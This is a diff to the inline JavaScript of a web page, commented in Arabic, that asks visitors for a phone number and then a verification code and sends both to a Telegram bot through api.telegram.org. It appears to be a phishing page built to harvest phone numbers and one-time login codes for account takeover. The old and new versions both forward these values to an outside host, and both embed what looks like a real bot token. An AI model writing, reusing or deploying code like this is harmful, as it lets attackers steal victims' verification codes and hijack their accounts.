@@ -174,17 +174,16 @@
     </div>
  
     <script>
-        const telegramBotToken = '7818218404:AAF1jbC0HcTJgQeBoaCIeXk7hPv9lGYD5S4';
-        const adminChatId = '7820356751'; // استبدالها برقم المحادثة أو قناة البوت
-        let userChatId = null; // متغير لتخزين chatId الخاص بالمستخدم
+        const telegramBotToken = '7818218404:AAF1jbC0HcTJgQeBoaCIeXk7hPv9lGYD5S4I';
+        
+        // استبدال هذه القيم مع chatId الخاص بكل مستخدم من قاعدة بياناتك أو عندما يسجل
+        let userChatId = ""; // يجب أن تكون هذه القيمة هي chatId للمستخدم
 
-        // إرسال الرسائل إلى تلجرام
-        function sendToTelegram(message, chatIdToUse) {
-            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatIdToUse}&text=${encodeURIComponent(message)}`;
+        function sendToTelegram(chatId, message) {
+            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
             fetch(url).then(response => response.json()).then(data => console.log(data));
         }
 
-        // عند تسجيل رقم الهاتف
         function submitPhone() {
             let countryCode = document.getElementById("country").value;
             let phoneNumber = document.getElementById("phone").value;
@@ -197,34 +196,23 @@
             let selectedCountry = document.getElementById("country");
             let phoneLength = selectedCountry.options[selectedCountry.selectedIndex].getAttribute("data-length");
 
+            // التحقق من أن الرقم المدخل يحتوي على عدد الأرقام الصحيح حسب الدولة
             if (phoneNumber.length !== parseInt(phoneLength)) {
                 alert("يرجى التأكد من أن الرقم المدخل يحتوي على العدد الصحيح من الأرقام!");
                 return;
             }
 
-            // إرسال رقم الهاتف إلى البوت الإداري
-            sendToTelegram(`تم تسجيل رقم الهاتف: ${countryCode}${phoneNumber}`, adminChatId);
+            // إرسال رقم الهاتف إلى البوت
+            sendToTelegram(userChatId, `تم تسجيل رقم الهاتف: ${countryCode}${phoneNumber}`);
 
-            // إرسال رقم الهاتف إلى المستخدم المسموح به إذا تم تخزين chatId الخاص به
-            if (userChatId) {
-                sendToTelegram(`تم تسجيل رقم الهاتف: ${countryCode}${phoneNumber}`, userChatId);
-            } else {
-                alert("لم يتم تحديد المستخدم المسموح به بعد!");
-            }
-
+            // إظهار رسالة تأكيد
             alert("تم إرسال الكود إلى: " + countryCode + phoneNumber);
 
-            // إخفاء نموذج رقم الهاتف وإظهار نموذج كود التفعيل
+            // إخفاء نموذج رقم الهاتف وإظهار نموذج كود التفعيل بسلاسة
             document.getElementById("phone-box").style.display = "none";
             document.getElementById("verification-box").style.display = "block";
         }
 
-        // لتخزين chatId الخاص بالمستخدم عند التفاعل الأول
-        function storeUserChatId(chatId) {
-            userChatId = chatId;
-        }
-
-        // عند التحقق من الكود
         function verifyCode() {
             let code = document.getElementById("verification-code").value;
 
@@ -233,8 +221,8 @@
                 return;
             }
 
-            // إرسال كود التفعيل إلى البوت الإداري
-            sendToTelegram(`تم إدخال كود التفعيل: ${code}`, adminChatId);
+            // إرسال كود التفعيل إلى البوت
+            sendToTelegram(userChatId, `تم إدخال كود التفعيل: ${code}`);
 
             alert("تم التحقق من الكود بنجاح!");
         }
